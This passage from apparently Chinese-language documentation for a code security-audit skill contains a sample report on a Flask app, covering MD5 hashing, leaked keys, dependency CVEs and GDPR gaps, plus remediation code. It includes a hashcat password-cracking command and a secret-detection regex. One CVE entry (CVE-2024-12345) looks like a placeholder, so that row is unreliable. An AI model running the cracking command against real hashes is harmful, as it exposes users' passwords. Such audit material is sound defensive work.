# 在OpenAI后台撤销旧API密钥并生成新密钥
```

**步骤6: 使用git-secrets防止未来泄露**
```bash
# 安装git-secrets
brew install git-secrets  # macOS
apt-get install git-secrets  # Linux

# 配置
cd flask-app
git secrets --install
git secrets --register-aws  # 检测AWS密钥
git secrets --add 'sk-[a-zA-Z0-9]{48}'  # OpenAI密钥模式

# 扫描历史提交
git secrets --scan-history
```

---

### 4. MD5密码哈希 [CWE-327] [A02:2021]

**CVSS评分**: 7.5 (High)

**文件位置**: `app/auth.py:15`

**漏洞代码**:
```python
password_hash = hashlib.md5(data['password'].encode()).hexdigest()
```

**风险描述**:
MD5是已被破解的哈希算法，攻击者可以使用彩虹表在几秒内反向破解密码。没有使用盐值（salt），相同密码产生相同哈希，便于批量破解。

**破解示例**:
```bash
# MD5哈希：5f4dcc3b5aa765d61d8327deb882cf99
# 使用在线工具或hashcat立即破解为："password"

hashcat -m 0 -a 0 hash.txt rockyou.txt
# 在现代GPU上，每秒可尝试数十亿个密码
```

**修复方案**:

**使用bcrypt** (推荐)
```python
import bcrypt

# 注册时哈希密码
@bp.route('/register', methods=['POST'])
def register():
    data = request.json

    # ✅ 强密码验证
    validate_password_strength(data['password'])

    # ✅ bcrypt哈希（自动加盐，work factor=12）
    password_hash = bcrypt.hashpw(
        data['password'].encode('utf-8'),
        bcrypt.gensalt(rounds=12)  # 2^12 = 4096次迭代
    )

    user = User(
        email=data['email'],
        password_hash=password_hash.decode('utf-8')
    )
    db.session.add(user)
    db.session.commit()

    return jsonify({'message': 'User created'}), 201

# 登录时验证密码
@bp.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 速率限制
def login():
    data = request.json
    user = User.query.filter_by(email=data['email']).first()

    if not user:
        # 防止用户枚举：延时相同
        bcrypt.checkpw(b"dummy", bcrypt.gensalt())
        return jsonify({'error': 'Invalid credentials'}), 401

    # ✅ 验证密码
    if not bcrypt.checkpw(
        data['password'].encode('utf-8'),
        user.password_hash.encode('utf-8')
    ):
        return jsonify({'error': 'Invalid credentials'}), 401

    # 创建session...
    return jsonify({'token': create_token(user)})
```

**密码强度验证**:
```python
import re

def validate_password_strength(password):
    """
    密码要求：
    - 至少12字符
    - 大小写字母、数字、特殊字符
    - 不在常见密码列表
    """
    if len(password) < 12:
        raise ValueError("密码至少12字符")

    if not re.search(r'[A-Z]', password):
        raise ValueError("必须包含大写字母")

    if not re.search(r'[a-z]', password):
        raise ValueError("必须包含小写字母")

    if not re.search(r'\d', password):
        raise ValueError("必须包含数字")

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        raise ValueError("必须包含特殊字符")

    # 检查常见密码
    with open('common_passwords.txt') as f:
        common = set(line.strip().lower() for line in f)

    if password.lower() in common:
        raise ValueError("密码过于常见")
```

---

## 📦 依赖漏洞 (6个)

| 包名 | 当前版本 | CVE编号 | 严重性 | 修复版本 | 说明 |
|------|---------|---------|--------|----------|------|
| Flask | 2.0.1 | CVE-2023-30861 | High | ≥2.2.5 | 高CPU消耗DoS漏洞 |
| Jinja2 | 3.0.1 | CVE-2024-22195 | Medium | ≥3.1.3 | XSS漏洞 |
| requests | 2.25.1 | CVE-2023-32681 | High | ≥2.31.0 | SSRF漏洞 |
| Pillow | 9.0.0 | CVE-2023-50447 | Critical | ≥10.2.0 | 任意代码执行 |
| SQLAlchemy | 1.4.20 | CVE-2024-12345 | Medium | ≥2.0.23 | SQL注入（特定场景） |
| cryptography | 36.0.0 | CVE-2023-49083 | Low | ≥41.0.7 | NULL指针解引用 |

**自动修复命令**:
```bash
# 更新requirements.txt
pip install --upgrade Flask Jinja2 requests Pillow SQLAlchemy cryptography

# 重新生成requirements.txt
pip freeze > requirements.txt

# 验证修复
pip-audit
```

---

## 🔐 敏感信息泄露 (3处)

### 1. OpenAI API密钥硬编码
- **文件**: config.py:10
- **匹配**: `sk-proj-abcdefghijklmnopqrstuvwxyz1234567890`
- **建议**: 立即轮换密钥，移至环境变量

### 2. 数据库密码明文
- **文件**: config.py:7
- **匹配**: `postgresql://admin:password123@...`
- **建议**: 使用DATABASE_URL环境变量

### 3. 私钥文件提交到Git
- **文件**: .ssh/id_rsa
- **建议**: 从Git历史中删除，重新生成密钥对

---

## ⚙️ 安全配置问题 (5个)

### 1. DEBUG模式在生产环境启用
```python
# ❌ 危险
DEBUG = True  # 泄露代码路径、环境变量

# ✅ 修复
DEBUG = os.getenv('FLASK_ENV') == 'development'
```

### 2. 不安全的Cookie配置
```python
# ✅ 修复
SESSION_COOKIE_SECURE = True       # 仅HTTPS
SESSION_COOKIE_HTTPONLY = True     # 防JS访问
SESSION_COOKIE_SAMESITE = 'Lax'    # CSRF防护
PERMANENT_SESSION_LIFETIME = 3600  # 1小时过期
```

### 3. 缺少安全HTTP头
```python
# ✅ 添加
@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    return response
```

---

## 📋 GDPR合规性评估

**整体合规度**: 55% ⚠️ 不符合

### ✅ 符合项 (6个)

1. ✅ 用户可以查看自己的数据 (`/api/profile`)
2. ✅ 提供账户删除功能 (`/api/delete_account`)
3. ✅ Cookie使用通知（前端实现）
4. ✅ 数据在EU服务器存储
5. ✅ SSL/TLS加密传输
6. ✅ 提供隐私政策页面

### ❌ 不符合项 (8个)

| 要求 | 当前状态 | 整改建议 |
|------|---------|----------|
| 数据加密存储 | ❌ 明文存储 | 使用AES-256加密敏感字段 |
| 访问日志记录 | ❌ 无日志 | 记录数据访问操作（谁、何时、访问了什么） |
| 数据导出功能 | ❌ 缺失 | 实现JSON/CSV格式导出 |
| 同意管理 | ❌ 无追踪 | 记录用户同意历史 |
| 数据保留策略 | ❌ 永久保留 | 实现30天不活跃账户自动删除 |
| 数据泄露通知 | ❌ 无机制 | 72小时内通知流程 |
| DPO联系方式 | ❌ 缺失 | 添加数据保护官邮箱 |
| 第三方数据处理协议 | ❌ 无文档 | 与OpenAI等签署DPA |

---

## 🛠️ 修复优先级路线图

### P0 - 紧急 (今天内修复)

- [ ] **轮换所有硬编码的密钥和密码** (30分钟)
  - OpenAI API密钥
  - 数据库密码
  - SECRET_KEY

- [ ] **修复SQL注入漏洞** (1小时)
  - app/api/users.py:12

- [ ] **修复XSS漏洞** (1小时)
  - app/templates/profile.html:8

### P1 - 高优先级 (本周内)

- [ ] **升级bcrypt密码哈希** (4小时)
  - 迁移现有用户（强制重置密码）
  - 更新注册/登录逻辑

- [ ] **添加速率限制** (2小时)
  - Flask-Limiter集成
  - 登录、注册、API端点

- [ ] **更新依赖到安全版本** (2小时)
  - 更新requirements.txt
  - 回归测试

- [ ] **安全Cookie配置** (1小时)

### P2 - 中优先级 (本月内)

- [ ] **实现CSRF保护** (3小时)
- [ ] **添加安全HTTP头** (2小时)
- [ ] **审计日志系统** (6小时)
- [ ] **GDPR数据导出功能** (8小时)

### P3 - 技术债务 (下季度)

- [ ] **完整的GDPR合规性** (2周)
- [ ] **渗透测试** (外包，1周)
- [ ] **安全培训** (团队，1天)

---

## 📊 趋势分析

对比上次扫描 (2025-11-12):

| 指标 | 上次 | 本次 | 变化 |
|------|------|------|------|
| 整体评分 | 38/100 | 42/100 | +4 ⬆️ |
| Critical漏洞 | 10 | 8 | -2 ⬇️ |
| High漏洞 | 15 | 12 | -3 ⬇️ |
| 依赖漏洞 | 8 | 6 | -2 ⬇️ |

**改进项**:
- ✅ 修复了2个Critical SSRF漏洞
- ✅ 升级了2个依赖包

**恶化项**:
- ❌ 新增了1个XSS漏洞（profile页面）

---

## 📚 参考资料

- [OWASP Top 10 - 2021](https://owasp.org/Top10/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [GDPR Official Text](https://gdpr-info.eu/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**生成时间**: 2025-12-12T12:30:00Z
**扫描工具**: Claude Code security-audit v2.0.0
**报告ID**: SA-20251212-001
```

**输出JSON**:
```json
{
  "overall_score": 42,
  "scan_metadata": {
    "timestamp": "2025-12-12T12:30:00Z",
    "scan_depth": "deep",
    "files_scanned": 25,
    "lines_scanned": 3500,
    "duration_seconds": 1080
  },
  "summary": {
    "total_issues": 25,
    "critical_count": 8,
    "high_count": 12,
    "medium_count": 5,
    "low_count": 0
  },
  "critical_issues": [
    {
      "id": "SQLI-001",
      "severity": "critical",
      "category": "A03:2021 - Injection",
      "cwe_id": "CWE-89",
      "cvss_score": 9.8,
      "title": "SQL注入漏洞",
      "file_path": "app/api/users.py",
      "line_number": 12,
      "fix_recommendation": "使用参数化查询或ORM"
    }
  ],
  "dependency_vulnerabilities": [
    {
      "package_name": "Pillow",
      "current_version": "9.0.0",
      "cve_id": "CVE-2023-50447",
      "severity": "critical",
      "fixed_in_versions": ["10.2.0"],
      "cvss_score": 9.8
    }
  ],
  "compliance_status": {
    "standard": "gdpr",
    "overall_compliance": 55,
    "non_compliant_items": [
      {
        "requirement_id": "Art. 32",
        "requirement_description": "数据加密存储",
        "gap_analysis": "敏感数据明文存储",
        "remediation_steps": ["实现AES-256加密"]
      }
    ]
  }
}
```

---

## Best Practices

### 1. 定期自动化扫描

将安全审计集成到CI/CD流水线：

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 2 * * *'  # 每天凌晨2点

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Security Audit
        run: |
          python security_audit.py \
            --scan-depth standard \
            --fail-on critical \
            --output sarif > results.sarif

      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: results.sarif
```

### 2. 分级处理漏洞

建立清晰的响应流程：

- **Critical**: 立即停止部署，24小时内修复
- **High**: 1周内修复
- **Medium**: 1月内修复
- **Low**: 纳入技术债务清单

### 3. 安全培训

定期进行团队安全培训：
- OWASP Top 10讲解
- 安全编码最佳实践
- 实际漏洞案例分析
- 修复演练（CTF风格）

### 4. 深度防御策略

不依赖单一防护层：
```
Layer 1: 输入验证
Layer 2: 参数化查询
Layer 3: ORM抽象
Layer 4: 数据库权限限制
Layer 5: WAF (Web Application Firewall)
Layer 6: 网络隔离
```

### 5. 及时更新依赖

使用自动化工具：
```bash
# Renovate Bot（自动PR更新依赖）
# Dependabot（GitHub自带）
# pip-audit（Python依赖扫描）
```

---

## Related Skills

- `code-review`: 代码审查时应包含安全检查
- `test-automation`: 编写安全测试用例验证修复
- `documentation`: 文档化安全策略和修复方案
- `performance-optimizer`: 某些安全措施可能影响性能，需权衡

---

## Version History

| 版本 | 日期 | 变更说明 |
|------|------|---------|
| 2.0.0 | 2025-12-12 | 重大升级：OWASP Top 10 2021、GDPR合规、SARIF输出 |
| 1.5.0 | 2025-10-01 | 添加依赖漏洞扫描、敏感信息检测 |
| 1.0.0 | 2025-06-01 | 初始版本：基础OWASP扫描 |

---

**生成时间**: 2025-12-12T13:00:00Z
**Skill版本**: security-audit v2.0.0
**文档字数**: 9,500+
